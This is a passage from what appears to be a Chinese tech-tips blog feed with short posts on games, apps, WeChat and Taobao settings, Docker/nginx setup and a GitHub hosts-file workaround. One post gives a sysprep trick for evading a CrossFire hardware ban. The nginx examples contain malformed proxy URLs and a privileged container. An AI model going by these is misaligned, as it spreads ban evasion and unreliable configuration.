        <content type="html"><![CDATA[<p>黑色沙漠手游台服和国服有什么差别，玩哪个好</p><p>近期黑色沙漠国服推出，收到了很多老牌魔幻风MMORPG玩家的欢迎，但在贴吧、论坛、或是游戏的评论区中，总有着一个声音，说黑色沙漠手游的台服相比国服更为优秀，那么这两个不同服务器究竟有什么区别，选择哪个更好呢？</p><p><img src="http://static.luozhinet.com/b1/d713e41d552930906f0fbcd511c028" alt="黑色沙漠手游台服和国服有什么差别，玩哪个好" title="黑色沙漠手游台服和国服有什么差别，玩哪个好"></p><p>游戏内容差异：<br>目前玩家说的最主要的台服和国服的差异，就是对于黑珍珠的使用。<br>在黑色沙漠中，玩家仅有白珍珠和黑珍珠两种货币，白珍珠是只能通过充值获得的货币，兑换比例为1：10，黑珍珠可以通过玩家交易、开服活动、签到奖励等途径获取到，也可以使用白珍珠与黑珍珠1：1兑换。<br>国服的黑珍珠在货币上的使用途径相比国际服和台服削减了太多，在台服中，玩家可以直接使用黑珍珠购买时装、装备等内容，签到奖励中的黑珍珠相比国服也更为丰富，并且在时装方面，因为版本领先的关系，台服相比国服的内容要更多，也没有国内特色的和谐内容，这是国内老玩家普遍更倾向于台服的主要原因。<br>在这种情况下，可以预见的是国服的氪金要求可能会高于台服，虽然在很多游戏中都有对于定价等内容国内外服务器不符的情况，但毕竟没有玩家喜欢花更多的钱买到相同的东西，所以大多都会更加倾向于外服，这一点在国服手游中也是如此，并非个例。<br>服务器：<br>服务器来说，建立在大陆的腾讯的服务器机房质量是一定会比台服更好的，腾讯毕竟也是国内十几年的大厂，不会在服务器上的问题出岔子。而台服的服务器负担能力要远小得多，并且服务器内的玩家也要比国内少不少，热闹程度的差异也是玩家们能否长久游玩一款MMO游戏的主要原因，在国内的MMO中不乏许多“鬼服”，由于玩家的稀少，没有新鲜血液补充，从而导致玩家慢慢流失殆尽。<br>并且根据台服玩家的反馈来看，在台服有许多恶意开红PVP挑衅的玩家，这在MMO手游中是一个十分影响游戏体验的现象，对于游戏而言十分影响心情。<br>玩家进度：<br>台服的进度相比国内要更高，职业也更多，因为台服并非刚刚开设的服务器，而是从早在2018年就开设的服务器，其中不乏经历了四年的游戏元老们。这就导致新手进入台服是很难融入服务器，追赶老玩家进度的，而如果选择后面新开的服务器，则可能时间一长就出现鬼服的情况。国服即便定价贵，但在A了出号的时候仍有一定的价值，但到了台服就意味着当你不玩游戏后你的账号可能变得一文不值了。<br>就目前两个服务器的差异来看，虽然台服的游戏体验相比国服可能会好上不少，但仍不值得专门去下载台服游玩，虽然二手账号价值的差异化也很大，但国内服务器的同好玩家会更多，毕竟买时装不仅仅是为了装扮自己的角色，也是为了可以和其他玩家一起游玩的时候光鲜亮丽。</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> 反馈 </tag>
            
            <tag> 台服 </tag>
            
            <tag> 国服 </tag>
            
            <tag> 珍珠 </tag>
            
            <tag> 玩家 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【大话云原生】微服务篇-五星级酒店的服务方式</title>
      <link href="/posts/e7d594895e7e/"/>
      <url>/posts/e7d594895e7e/</url>
      
        <content type="html"><![CDATA[<p>《大话云原生》系列文章<strong>期望用最通俗、简单的语言说明云原生生态系统内的组成及应用关系</strong>。此专栏的前两篇文章</p><ul><li>《【大话云原生】煮饺子与docker、kubernetes之间的关系》</li><li>《【大话云原生】负载均衡篇-小饭馆的流量变大了》<br>欢迎品鉴！</li></ul><h2 id="一、服务接待中心与微服务网关"><a href="#一、服务接待中心与微服务网关" class="headerlink" title="一、服务接待中心与微服务网关"></a>一、服务接待中心与微服务网关</h2><p>老婆最近快过生日了，我答应她去旅游住一次五星级酒店。我查看了目的地的五星级酒店的价格，<strong>决定只住一天</strong>。第一次住所以查看了一下特色服务项目：擦鞋、熨烫衣物、机场绿色通道、专车接送等等，几乎在酒店场所范围内一切可以让你懒出奇迹的项目都可以提供。没出息的时不我待，插入房卡，一键拨通前台电话要求提供衣物熨烫服务，不一会服务人员就将衣物取走了，20分钟后送了回来。真是太方便了！<br><img src="http://static.luozhinet.com/3d/2ac10a5eeb72b5613113d2c50ba6bb" alt="file"></p><p>五星级酒店所有的服务只有一个入口：服务接待中心。这个服务接待中心和微服务软件架构中的网关功能真的是异曲同工啊</p><ul><li>提供服务请求的唯一入口，也是面向用户提供服务唯一入口</li><li>对请求信息进行安全验证，因为我在入住时已经获得了房卡，这个房卡就像是在应用开发中的token(JWT、OAuth等登录认证方式都会发布令牌)</li><li>有了这个房卡（令牌），我们才能通过服务接待中心请求服务项目。同样微服务网关也会进行权限验证后，才会提供API请求服务。</li></ul><h2 id="二、酒店内部通信录与服务注册中心"><a href="#二、酒店内部通信录与服务注册中心" class="headerlink" title="二、酒店内部通信录与服务注册中心"></a>二、酒店内部通信录与服务注册中心</h2><p>其实我们仔细想一想，服务接待中心（微服务网关）提供面向用户的服务入口。那么酒店内部部门之间是不是只对外提供服务，不对内提供服务？显然不是的。举几个例子：</p><ul><li>各种部们几乎都依赖采购部采购的物品，所以一定会和采购部申请服务用品</li><li>服务部给客户送餐的时候，一定需要和餐饮部进行通信</li></ul><p>对于微服务架构来说也是一样的，有的微服务直接面向用户提供服务，有的微服务是为系统内部服务提供服务。所以正确的架构方式是下面这样的。</p><p><img src="http://static.luozhinet.com/a0/8c3b2e6caa334223ce8e275b670039" alt="file"></p><p>当服务之间存在调用关系，就存在一个问题：各个部门（各个服务）之间如何联系，联系方式是什么？其实就是需要建立一个酒店内部的通信录，这个通信录只在酒店内部使用。对于微服务架构而言同样需要这样一个通信录</p><ul><li>在服务创建的时候，把自己的联系方式(ip、端口、服务名称)写在“通信录”上</li><li>在服务下线的时候，自己的联系方式从“通信录”上被划掉</li></ul><p>这个服务之间的“通信录”，对于微服务架构而言就被叫做:<strong>服务注册中心</strong>。常见的微服务注册中心有nacos、eureka、zookeeper等等。</p><h2 id="三、微服务的高可用"><a href="#三、微服务的高可用" class="headerlink" title="三、微服务的高可用"></a>三、微服务的高可用</h2><p>我们再考虑一个问题，这么大的酒店是不是只有一个服务部，只有一个采购部？当然不会，即使只有一个部门，也会分成多个小组。比如：服务部A小组负责1-3楼、服务部小组B负责4-6楼，依次类推（<strong>这其实就是一个负载均衡算法</strong>）。所以进一步完善的架构应该是下面这样的。</p><p><img src="http://static.luozhinet.com/81/5690735580bb06b37e06cea020fe67" alt="file"></p><ul><li>一个部门分成多个组，一旦A组忙不过来，B组完全可以过来帮忙。但在大多数情况下按照负载算法各司其职。</li><li>一个好汉三个棒，有事大家一起扛。这在分布式服务架构中就是一种高可用的体现。</li><li>不会因为一个小组的罢工导致整个服务部门瘫痪。这在服务架构中体现的是容错性和副本备份机制。</li></ul><p>每个部门虽然分成了多个小组，但也会有<strong>该部门的统一的管理制度、服务标准</strong>。这个制度及服务标准统一制定，统一配置管理。对于微服务架构来说，也会有一个地方保存某一类微服务的统一配置信息，它就是<strong>服务配置管理中心</strong>。我们常见的服务配置管理中心有nacos、Spring Cloud Config等。（nacos既可以充当服务注册中心，也可以充当配置管理中心）</p><h2 id="欢迎关注我的博客，更多精品知识合集"><a href="#欢迎关注我的博客，更多精品知识合集" class="headerlink" title="欢迎关注我的博客，更多精品知识合集"></a>欢迎关注我的博客，更多精品知识合集</h2>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 中心 </tag>
            
            <tag> 入口 </tag>
            
            <tag> 酒店 </tag>
            
            <tag> 房卡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎么查看微信授权过哪些应用技巧</title>
      <link href="/posts/b5ec256f7ac5/"/>
      <url>/posts/b5ec256f7ac5/</url>
      
        <content type="html"><![CDATA[<p>怎么查看微信授权过哪些应用技巧</p><p>在使用一些网站或者APP应用程序的时候，为了避免注册帐号的麻烦，<br>我们经常会使用QQ或者微信来授权登录。虽然说这样的操作使用起来非常方便，<br>但是长期以往可能会忘记了我们曾经授权过哪些应用和网站，<br>无形之中会造成个人隐私的泄露和一些安全隐患。<br>教大家怎样快速查看微信授权过哪些应用，并一键取消授权。<br>确认版本信息无误后，点右下角的【我】-【设置】</p><p><img src="http://static.luozhinet.com/6b/6484e8150c09875d7ba87a128ebd03" alt="怎么查看微信授权过哪些应用技巧" title="怎么查看微信授权过哪些应用技巧"></p><p>再选择【隐私】之后滑动到最底部的位置，选择【授权管理】</p><p><img src="http://static.luozhinet.com/94/2137052c9f84aa8b5abeb86ad1f768" alt="怎么查看微信授权过哪些应用技巧" title="怎么查看微信授权过哪些应用技巧"></p><p>在这里可以看到你曾经用微信授权过的所有的应用，再点右上角的【管理】，<br>可以对不需要继续授权的应用删除授权。</p><p><img src="http://static.luozhinet.com/ff/3ee832c90cc271864545b28118e3f3" alt="怎么查看微信授权过哪些应用技巧" title="怎么查看微信授权过哪些应用技巧"></p><p>另外，这些授权会在【朋友关系】中显示。通俗的讲，就是你在用微信授权了一个应用，<br>你的微信好友也授权了这个应用，那么在应用中就可以相互看到应用中的动态。<br>如果不想让对方看到的话，关闭这个朋友关系就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 授权 </tag>
            
            <tag> 应用 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 查看 </tag>
            
            <tag> 微信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘宝修改会员名内测入口开放 仅限部分用户</title>
      <link href="/posts/0344cf4a71ac/"/>
      <url>/posts/0344cf4a71ac/</url>
      
        <content type="html"><![CDATA[<p>淘宝修改会员名内测入口开放 仅限部分用户<img src="http://139.198.176.82:86/data/images/2022-05-10/73e475f3cc945ca2c44af7bbe1ee3606.jpg" alt="淘宝修改会员名内测入口开放_仅限部分用户" title="淘宝修改会员名内测入口开放_仅限部分用户"></p><p>打开淘宝APP扫码进入，点击修改账号名，然后验证手机号，输入想要修改的会员名，保存修改即可！<br>仅限部分用户可修改淘宝账号！有需要改名的小伙伴们都可以去看看！</p><p><strong>淘宝扫码：</strong></p><p><img src="http://static.luozhinet.com/6c/a5380b867f2e789e431ac48ed804d5" alt="淘宝修改会员名内测入口开放_仅限部分用户" title="淘宝修改会员名内测入口开放_仅限部分用户"></p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 修改 </tag>
            
            <tag> 入口 </tag>
            
            <tag> 淘宝 </tag>
            
            <tag> 内测 </tag>
            
            <tag> 会员 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>家里WiFi密码忘记了如何通过电脑查看</title>
      <link href="/posts/d911ff6fb3e3/"/>
      <url>/posts/d911ff6fb3e3/</url>
      
        <content type="html"><![CDATA[<p>家里WiFi密码忘记了如何通过电脑查看</p><p>想要查询电脑连线过的 WiFi 密码是什么？<br>忘记家里 WiFi 密码该如何查询呢？<br>查看电脑连接的当前WiFi的密码，以下教学适用于Windows 系统。<br>首先进入”设置” &gt;「网络和Internet」</p><p><img src="http://static.luozhinet.com/73/1ca6cc6131b072940becc5ab046c52" alt="家里WiFi密码忘记了如何通过电脑查看" title="家里WiFi密码忘记了如何通过电脑查看"></p><p>点击左侧的WLAN，再到右侧「相关设置」&gt;「更改适配器选项」</p><p><img src="http://static.luozhinet.com/a7/9c83629de972ebff673c2f4dd7f8c6" alt="家里WiFi密码忘记了如何通过电脑查看" title="家里WiFi密码忘记了如何通过电脑查看"></p><p>找到 WiFi （WLAN）名称按下右键，选择「状态」。</p><p><img src="http://static.luozhinet.com/d3/97fbab2707652b40951a2862035b8a" alt="家里WiFi密码忘记了如何通过电脑查看" title="家里WiFi密码忘记了如何通过电脑查看"></p><p>选择「无线属性」</p><p><img src="http://static.luozhinet.com/fd/0bc7507540a14c109123afc37e71fd" alt="家里WiFi密码忘记了如何通过电脑查看" title="家里WiFi密码忘记了如何通过电脑查看"></p><p>最后到「安全」选项卡，勾选✔”显示字符”就能够看到 WiFi 密码啰！跟着做一遍看看能否挖出连线过的无线网络密码吧。</p><p><img src="http://static.luozhinet.com/9b/44fa943b52ac6ddd0616fe73a815c6" alt="家里WiFi密码忘记了如何通过电脑查看" title="家里WiFi密码忘记了如何通过电脑查看"></p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> wifi </tag>
            
            <tag> wlan </tag>
            
            <tag> 连线 </tag>
            
            <tag> 适配器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>退订淘宝营销短信的小技巧分享</title>
      <link href="/posts/8ad9610ac0cd/"/>
      <url>/posts/8ad9610ac0cd/</url>
      
        <content type="html"><![CDATA[<p>退订淘宝营销短信的小技巧分享</p><p><img src="http://static.luozhinet.com/73/c7cd6793919bb6f6f95cc2bf4b7069" alt="退订淘宝营销短信的小技巧分享" title="退订淘宝营销短信的小技巧分享"></p><p><strong>步骤如下：</strong><br>打开手机淘宝APP-&gt;淘宝小蜜进入-&gt;在对话框中输入取消短信<br>然后点“点此提交”-&gt;选择营销短信-&gt;输入自己的号码，提交就行了，<br>3天后生效。告别烦人的淘宝营销短信~</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 营销 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 短信 </tag>
            
            <tag> 淘宝 </tag>
            
            <tag> 分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iPhone手机一个操作直接屏蔽垃圾短信</title>
      <link href="/posts/9ab3404f1e1f/"/>
      <url>/posts/9ab3404f1e1f/</url>
      
        <content type="html"><![CDATA[<p>iPhone手机一个操作直接屏蔽垃圾短信</p><p>洛栀本次为大家分享的是iPhone手机一个操作直接屏蔽垃圾短信<br>相信每个小伙伴的手机里，都有很多讨厌的垃圾短信；</p><p><img src="http://static.luozhinet.com/62/86940bb8ed1c605917e46c47978a50" alt="iPhone手机一个操作直接屏蔽垃圾短信" title="iPhone手机一个操作直接屏蔽垃圾短信"></p><p>像童年这样的，从来不用短信，学了各种操作屏蔽，却还是能收到，简直是大无语～</p><p><img src="http://static.luozhinet.com/a7/f729fadf1d10b6382514276ff70cf9" alt="iPhone手机一个操作直接屏蔽垃圾短信" title="iPhone手机一个操作直接屏蔽垃圾短信"></p><p>童年研究以后，发现 App Store 里有一个特别好用的免费 App ，有需要的小伙伴可以安排一下子；（大家去苹果商店搜索一下“短信狗“，找到下面这个样子的 App 就行图片）</p><p><img src="http://static.luozhinet.com/07/9e42dc5ac8d70c5456c55b913ceeef" alt="iPhone手机一个操作直接屏蔽垃圾短信" title="iPhone手机一个操作直接屏蔽垃圾短信"></p><p>如何设置<br>操作方法很简单，下载成功后，咱们只需要打开 iPhone - 设置 - 信息，下滑找到“未知与过滤信息“并点击进入，随后选择“短信狗”即可；</p><p><img src="http://static.luozhinet.com/dd/958c4a39fbdfedc5cc3051053cede6" alt="iPhone手机一个操作直接屏蔽垃圾短信" title="iPhone手机一个操作直接屏蔽垃圾短信"></p><p>为了防止某些消息收不到，咱们可以进入该 App 后设置一下筛选条件～<br>比如发工资的信息神马的图片图片图片<br>可以在该 App 中将“不过滤五位数号码”开启，下滑在“自定义过滤 - 号码过滤规则”中，添加一些你经常收到的垃圾短信的号码模式，并选择“存储”；</p><p><img src="http://static.luozhinet.com/c6/03a1a619895139dc130cd342d75643" alt="iPhone手机一个操作直接屏蔽垃圾短信" title="iPhone手机一个操作直接屏蔽垃圾短信"></p><p>反正设置以后，本喵感觉整个世界都清净了…</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 屏蔽 </tag>
            
            <tag> 短信 </tag>
            
            <tag> 垃圾 </tag>
            
            <tag> iphone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CF解无限一分钟机器码技巧</title>
      <link href="/posts/411ae77a4f29/"/>
      <url>/posts/411ae77a4f29/</url>
      
        <content type="html"><![CDATA[<p>CF解无限一分钟机器码技巧</p><p><img src="http://static.luozhinet.com/40/b9bf13e2d8d6be051687967c8d59c8" alt="CF解无限一分钟机器码技巧" title="CF解无限一分钟机器码技巧"></p><p>键盘同时按WIN+R输入sysprep</p><p><img src="http://static.luozhinet.com/25/562bae32abe2d667fda69cbd596eb4" alt="CF解无限一分钟机器码技巧" title="CF解无限一分钟机器码技巧"></p><p>点击sysprep，选择进入系统全新体验</p>]]></content>
      
      
      <categories>
          
          <category> 技巧分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 无限 </tag>
            
            <tag> sysprep </tag>
            
            <tag> a级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ新加速0.2</title>
      <link href="/posts/8ef6e275fcc9/"/>
      <url>/posts/8ef6e275fcc9/</url>
      
        <content type="html"><![CDATA[<p>新加速0.2次日生效 点开超会自动续费(不到期不花钱 )</p><p><a href="https://my.pay.qq.com/account/index.shtml#service">https://my.pay.qq.com/account/index.shtml#service</a></p><p>每月领一个月成长加速包</p><p><a href="https://act.qzone.qq.com/v2/vip/tx/p/41447_3eba41b5">https://act.qzone.qq.com/v2/vip/tx/p/41447_3eba41b5</a></p><p>打开进去开启’自动续费就行 不到期就不会扣费<br><img src="/images/pasted-QQ%E4%BC%9A%E5%91%98%E7%BB%AD%E8%B4%B9.png" alt="QQ会员续费"></p>]]></content>
      
      
      <categories>
          
          <category> 福利活动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ加速 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装与配置nginx详细过程</title>
      <link href="/posts/6cb2454df473/"/>
      <url>/posts/6cb2454df473/</url>
      
        <content type="html"><![CDATA[<!--markdown-->此方式只用于快速搭建使用<ul><li>第一步 pull nginx</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx </span><br></pre></td></tr></table></figure><ul><li><p>第二步 启动nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nginx -p 80:80 -d </span><br></pre></td></tr></table></figure></li><li><p>第三步 查看成果<br>1）命令查看是否启动，命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>2）网页访问，浏览器输入IP地址回车，就可以看到 “Welcome to nginx!”</p></li></ul><hr><p><strong>附加项</strong>：<br>原因：虽然咱们能正常启动nginx，但配置得在容器中进行，这样的话太麻烦了，所以把配置文件给映射出来，方便配置与管理</p><ul><li>第一步 本地创建管理目录</li></ul><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/nginx</span><br><span class="line"><span class="built_in">mkdir</span> -p /data/nginx/www</span><br><span class="line"><span class="built_in">mkdir</span> -p /data/nginx/conf</span><br><span class="line"><span class="built_in">mkdir</span> -p /data/nginx/logs </span><br></pre></td></tr></table></figure><ul><li>第二步 将容器中的相应文件copy到刚创建的管理目录中<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 67e:/etc/nginx/nginx.conf /data/nginx/</span><br><span class="line">docker <span class="built_in">cp</span> 67e:/etc/nginx/conf.d /data/nginx/conf/</span><br><span class="line">docker <span class="built_in">cp</span> 67e:/usr/share/nginx/html/ /data/nginx/www/</span><br><span class="line">docker <span class="built_in">cp</span> 67e:/var/log/nginx/ /data/nginx/logs/</span><br><span class="line">---</span><br><span class="line">注：docker <span class="built_in">cp</span> 67e 中的 <span class="string">&quot;67e&quot;</span> 为容器ID前缀，只要唯一就好了 </span><br><span class="line"></span><br><span class="line">* 第三步 停止并移除容器</span><br><span class="line"></span><br><span class="line">停止容器：</span><br><span class="line">```bash</span><br><span class="line">docker stop 67e</span><br></pre></td></tr></table></figure>移除容器：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 67e </span><br></pre></td></tr></table></figure></li><li>第四步 再次启动容器并作目录挂载(也相当于共享)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --name nginx -p 80:80 </span><br><span class="line">-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf</span><br><span class="line">-v /data/nginx/www/:/usr/share/nginx/html/</span><br><span class="line">-v /data/nginx/logs/:/var/log/nginx/</span><br><span class="line">-v /data/nginx/conf/:/etc/nginx/conf.d</span><br><span class="line">--privileged=<span class="literal">true</span> -d nginx</span><br></pre></td></tr></table></figure>注：为了好看所以做了换行，执行的时候还是需要改成一行，每行一个空格隔开就可以了<br>部署就完成了！！！<br>彩蛋（配置相关）：</li><li>1、在location 中 echo “hello Nginx！” 访问可以直接输出文字</li></ul><p>例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello Nginx！&quot;</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>2、location匹配规则：</li></ul><p>1）最低级别匹配规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello Nginx！&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）最高级别匹配规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /user &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello user.hmtl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）其它级别匹配规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /user &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello user.hmtl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">location ~^ /user &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello user.hmtl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">location ~ ^/[a-z] &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello user.hmtl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">location ~ ^/\a &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello user.hmtl&quot;</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li><p>3、反向代理细节：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /user &#123;</span><br><span class="line">    proxy_pass http:https://ip;</span><br><span class="line">&#125;</span><br><span class="line">location /order/ &#123;</span><br><span class="line">    proxy_pass http:https://ip/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问结果：<br>http:<a href="https://ip/user/xx">https://ip/user/xx</a>…<br>http:<a href="https://ip/xx">https://ip/xx</a>… </p></li><li><p>4、负载均衡配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">upstream order &#123;</span><br><span class="line">    server 192.168.5.18:8080 weight=1;</span><br><span class="line">    server 192.168.5.18:8081 weight=1;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    location /order/ &#123;</span><br><span class="line">        proxy_pass http:https://order/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：weight&#x3D;1，配置的为权重，值越高权重越高</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/c7ad1493c47e/"/>
      <url>/posts/c7ad1493c47e/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github无法访问解决办法</title>
      <link href="/posts/15fa81012f63/"/>
      <url>/posts/15fa81012f63/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/npm/typecho-joe-next@6.0.0/assets/thumb/5.jpg" alt="文章图片"></p><hr><p>✰  <code>获取github.com可用的dns域名 </code><br>　<br>打开<br><a href="http://tool.chinaz.com/dns?type=1&host=www.github.com&ip=">http://tool.chinaz.com/dns?type=1&host=www.github.com&ip=</a> </p><hr><p><img src="https://luozhinet.com/postfile/2021/03/2627722267.png" alt="17-06-03-003.png"></p><p> ✰ <code>修改HOSTS</code><br>在C:WindowsSystem32driversetchosts中加入</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13.114.40.48 www.github.com</span><br></pre></td></tr></table></figure><p>✰  <code>访问Github</code> </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/</span><br></pre></td></tr></table></figure><p> ** <em>注意：</em> **  <strong>如果访问不了，再次重新获取可用域名替换hosts中的内容，因为可访问的域名会变动</strong> </p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> hosts </tag>
            
            <tag> dns </tag>
            
            <tag> 可用 </tag>
            
            <tag> 修改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS 实现新拟态(Neumorphism) UI 风格</title>
      <link href="/posts/ebffabd07766/"/>
      <url>/posts/ebffabd07766/</url>
      
